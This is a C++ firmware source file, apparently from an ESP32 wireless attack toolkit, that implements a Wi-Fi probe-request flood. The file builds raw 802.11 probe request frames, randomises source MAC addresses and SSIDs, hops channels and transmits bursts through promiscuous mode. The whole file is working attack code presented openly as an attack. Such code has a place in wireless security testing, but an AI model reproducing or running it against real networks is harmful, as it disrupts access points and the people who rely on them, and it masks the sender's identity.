/**
 * @file probe_flood.cpp
 * @brief Probe Flood attack implementation
 */

#include "probe_flood.h"
#include "../../core/event_bus.h"
#include "../../utils/wifi_utils.h"
#include "../../utils/raw_wifi.h"
#include <cstdlib>

#ifdef ARDUINO
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_err.h>
#else
#include "../../utils/wifi_utils.h"
#include "../../test/common/arduino_mocks.h"
#endif

namespace adversary {

// Static instance
ProbeFlood* ProbeFlood::s_instance_ = nullptr;

// Mode name strings
const char* getProbeFloodModeName(ProbeFloodMode mode) {
    switch (mode) {
        case ProbeFloodMode::RANDOM_SSIDS: return "Random";
        case ProbeFloodMode::SSID_LIST:    return "Custom List";
        case ProbeFloodMode::TARGETED:     return "Targeted";
        case ProbeFloodMode::BLANK:        return "Wildcard";
        default: return "Unknown";
    }
}

ProbeFlood& ProbeFlood::getInstance() {
    if (!s_instance_) {
        s_instance_ = new ProbeFlood();
    }
    return *s_instance_;
}

ProbeFlood::ProbeFlood()
    : state_(ProbeFloodState::IDLE)
    , config_()
    , stats_()
    , currentSsidIndex_(0)
    , lastProbeTime_(0)
    , lastHopTime_(0)
    , hopChannelIndex_(0)
    , sequenceNumber_(0)
    , initialized_(false)
{
    memset(currentSsid_, 0, sizeof(currentSsid_));
    memset(currentMac_, 0, sizeof(currentMac_));
}

bool ProbeFlood::init() {
    if (initialized_) return true;
    
#ifdef ESP32
    // Initialize WiFi in station mode for raw frame TX
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
#endif
    
    initialized_ = true;
    return true;
}

void ProbeFlood::deinit() {
    stop();
    initialized_ = false;
}

bool ProbeFlood::start(const ProbeFloodConfig& config) {
    if (!initialized_ && !init()) {
        setState(ProbeFloodState::ERROR);
        return false;
    }
    
    if (state_ == ProbeFloodState::RUNNING) {
        return true;  // Already running
    }
    
    config_ = config;
    stats_.reset();
    stats_.startTime = millis();
    
    currentSsidIndex_ = 0;
    sequenceNumber_ = 0;
    hopChannelIndex_ = 0;
    lastProbeTime_ = 0;
    lastHopTime_ = millis();
    
    // Set initial channel
    if (config_.channel > 0) {
        stats_.currentChannel = config_.channel;
    } else {
        stats_.currentChannel = HOP_CHANNELS[0];
    }
    
#ifdef ESP32
    // Enable promiscuous mode for raw TX
    esp_wifi_set_promiscuous(true);  // Direct call - TX only, no filter needed
    
    // Set initial channel
    wifi_utils::setChannel(stats_.currentChannel);
#endif
    
    // Initialize SSID list for list mode
    if (config_.mode == ProbeFloodMode::SSID_LIST && ssidList_.empty()) {
        // Default list if none set
        ssidList_ = {"Network1", "Network2", "WiFi", "linksys", "NETGEAR"};
    }
    
    // Generate initial MAC
    if (config_.randomizeMac) {
        generateRandomMac(currentMac_);
    } else {
        memcpy(currentMac_, config_.baseMac, 6);
    }
    
    // Get initial SSID
    if (config_.mode == ProbeFloodMode::TARGETED) {
        strncpy(currentSsid_, config_.ssid, 32);
        currentSsid_[32] = '\0';
    } else if (config_.mode == ProbeFloodMode::BLANK) {
        currentSsid_[0] = '\0';
    } else {
        const char* ssid = getNextSSID();
        if (ssid) {
            strncpy(currentSsid_, ssid, 32);
            currentSsid_[32] = '\0';
        }
    }
    
    setState(ProbeFloodState::RUNNING);
    return true;
}

void ProbeFlood::stop() {
    if (state_ == ProbeFloodState::IDLE) return;
    
#ifdef ESP32
    esp_wifi_set_promiscuous(false);
    
    // Release WiFi memory
    WiFi.mode(WIFI_OFF);
    delay(50);
#endif
    
    setState(ProbeFloodState::IDLE);
}

void ProbeFlood::togglePause() {
    if (state_ == ProbeFloodState::RUNNING) {
        setState(ProbeFloodState::PAUSED);
    } else if (state_ == ProbeFloodState::PAUSED) {
        setState(ProbeFloodState::RUNNING);
    }
}

void ProbeFlood::update() {
    if (state_ != ProbeFloodState::RUNNING) return;
    
    uint32_t now = millis();
    stats_.duration = now - stats_.startTime;
    
    // Handle channel hopping
    if (config_.channelHopEnabled && config_.channel == 0) {
        if (now - lastHopTime_ >= config_.channelHopIntervalMs) {
            hopChannel();
            lastHopTime_ = now;
        }
    }
    
    // Check if max probes reached
    if (config_.maxProbes > 0 && stats_.probesSent >= config_.maxProbes) {
        setState(ProbeFloodState::COMPLETED);
        return;
    }
    
    // Send probes at configured interval
    if (now - lastProbeTime_ >= config_.intervalMs) {
        if (config_.burstMode) {
            sendBurst();
        } else {
            sendProbe();
        }
        lastProbeTime_ = now;
    }
}

void ProbeFlood::sendProbe() {
    uint8_t frame[MAX_PROBE_SIZE];
    
    // Randomize MAC if configured
    if (config_.randomizeMac) {
        generateRandomMac(currentMac_);
    }
    
    // Get next SSID for non-targeted modes
    if (config_.mode != ProbeFloodMode::TARGETED && config_.mode != ProbeFloodMode::BLANK) {
        const char* ssid = getNextSSID();
        if (ssid) {
            strncpy(currentSsid_, ssid, 32);
            currentSsid_[32] = '\0';
        }
    }
    
    // Build the probe request frame
    size_t frameSize = buildProbeRequestFrame(frame, sizeof(frame),
                                               config_.mode == ProbeFloodMode::BLANK ? nullptr : currentSsid_,
                                               currentMac_,
                                               config_.targetBssid);
    
    if (frameSize > 0) {
#ifdef ESP32
        // Send the frame via RawWiFi utility
        if (RawWiFi::transmit(WiFiInterface::STATION, frame, frameSize, false)) {
            stats_.probesSent++;
        }
#else
        // Native testing - just count
        stats_.probesSent++;
#endif
    }
}

void ProbeFlood::sendBurst() {
    for (uint8_t i = 0; i < config_.burstCount; i++) {
        sendProbe();
        
        // Check max probes during burst
        if (config_.maxProbes > 0 && stats_.probesSent >= config_.maxProbes) {
            break;
        }
        
#ifdef ESP32
        if (config_.burstDelayMs > 0 && i < config_.burstCount - 1) {
            delay(config_.burstDelayMs);
        }
#endif
    }
}

void ProbeFlood::generateRandomMac(uint8_t* mac) {
    if (!mac) return;
    
    for (int i = 0; i < 6; i++) {
        mac[i] = random(0, 256);
    }
    // Set locally administered bit, clear multicast bit
    mac[0] = (mac[0] | 0x02) & 0xFE;
}

void ProbeFlood::generateRandomSsid(char* ssid, size_t maxLen) {
    if (!ssid || maxLen == 0) return;
    
    // Generate random length between 4 and 16
    size_t len = random(4, 17);
    if (len > maxLen - 1) len = maxLen - 1;
    
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < len; i++) {
        ssid[i] = charset[random(0, sizeof(charset) - 1)];
    }
    ssid[len] = '\0';
}

const char* ProbeFlood::getNextSSID() {
    switch (config_.mode) {
        case ProbeFloodMode::RANDOM_SSIDS:
            generateRandomSsid(currentSsid_, sizeof(currentSsid_));
            stats_.ssidsUsed++;
            return currentSsid_;
            
        case ProbeFloodMode::SSID_LIST:
            if (ssidList_.empty()) return nullptr;
            {
                const std::string& ssid = ssidList_[currentSsidIndex_];
                currentSsidIndex_ = (currentSsidIndex_ + 1) % ssidList_.size();
                if (currentSsidIndex_ == 0) stats_.ssidsUsed++;
                strncpy(currentSsid_, ssid.c_str(), 32);
                currentSsid_[32] = '\0';
                return currentSsid_;
            }
            
        case ProbeFloodMode::TARGETED:
            return config_.ssid;
            
        case ProbeFloodMode::BLANK:
        default:
            return nullptr;
    }
}

void ProbeFlood::hopChannel() {
    hopChannelIndex_ = (hopChannelIndex_ + 1) % HOP_CHANNEL_COUNT;
    stats_.currentChannel = HOP_CHANNELS[hopChannelIndex_];
    
#ifdef ESP32
    wifi_utils::setChannel(stats_.currentChannel);
#endif
}

void ProbeFlood::setCustomSSIDs(const std::vector<std::string>& ssids) {
    ssidList_ = ssids;
    currentSsidIndex_ = 0;
}

void ProbeFlood::setState(ProbeFloodState newState) {
    if (state_ == newState) return;
    
    ProbeFloodState oldState = state_;
    state_ = newState;
    
    // Publish state change event
    EventData event(EventType::ATTACK_STATE_CHANGED);
    event.payload.attack.attackType = static_cast<uint8_t>(AttackTypeId::PROBE_FLOOD);
    event.payload.attack.oldState = static_cast<int>(oldState);
    event.payload.attack.newState = static_cast<int>(newState);
    event.payload.attack.packetCount = stats_.probesSent;
    EventBus::getInstance().publish(event);
}

size_t ProbeFlood::buildProbeRequestFrame(uint8_t* buffer, size_t bufferSize,
                                           const char* ssid, const uint8_t* srcMac,
                                           const uint8_t* bssid) {
    if (!buffer || !srcMac) return 0;
    
    // Calculate minimum size needed
    size_t ssidLen = ssid ? strlen(ssid) : 0;
    if (ssidLen > 32) ssidLen = 32;
    
    // Frame structure:
    // - Frame Control (2) + Duration (2) + Addr1 (6) + Addr2 (6) + Addr3 (6) + SeqCtrl (2) = 24
    // - SSID IE: Tag (1) + Len (1) + SSID (0-32)
    // - Supported Rates IE: Tag (1) + Len (1) + Rates (8)
    size_t totalSize = 24 + 2 + ssidLen + 10;
    
    if (bufferSize < totalSize) return 0;
    
    memset(buffer, 0, totalSize);
    size_t pos = 0;
    
    // Frame Control: 0x40 0x00 = Management frame, Probe Request (subtype 4)
    buffer[pos++] = 0x40;
    buffer[pos++] = 0x00;
    
    // Duration
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    
    // Address 1: Destination (broadcast)
    buffer[pos++] = 0xFF;
    buffer[pos++] = 0xFF;
    buffer[pos++] = 0xFF;
    buffer[pos++] = 0xFF;
    buffer[pos++] = 0xFF;
    buffer[pos++] = 0xFF;
    
    // Address 2: Source MAC
    memcpy(&buffer[pos], srcMac, 6);
    pos += 6;
    
    // Address 3: BSSID (broadcast for wildcard, or specific)
    if (bssid) {
        memcpy(&buffer[pos], bssid, 6);
    } else {
        memset(&buffer[pos], 0xFF, 6);
    }
    pos += 6;
    
    // Sequence Control (will be filled by hardware)
    buffer[pos++] = 0x00;
    buffer[pos++] = 0x00;
    
    // Tagged Parameters
    
    // SSID Parameter Set (Tag 0)
    buffer[pos++] = 0x00;  // Tag: SSID
    buffer[pos++] = (uint8_t)ssidLen;  // Length
    if (ssid && ssidLen > 0) {
        memcpy(&buffer[pos], ssid, ssidLen);
        pos += ssidLen;
    }
    
    // Supported Rates (Tag 1)
    buffer[pos++] = 0x01;  // Tag: Supported Rates
    buffer[pos++] = 0x08;  // Length: 8 rates
    buffer[pos++] = 0x82;  // 1 Mbps (basic)
    buffer[pos++] = 0x84;  // 2 Mbps (basic)
    buffer[pos++] = 0x8B;  // 5.5 Mbps (basic)
    buffer[pos++] = 0x96;  // 11 Mbps (basic)
    buffer[pos++] = 0x0C;  // 6 Mbps
    buffer[pos++] = 0x12;  // 9 Mbps
    buffer[pos++] = 0x18;  // 12 Mbps
    buffer[pos++] = 0x24;  // 18 Mbps
    
    return pos;
}

} // namespace adversary
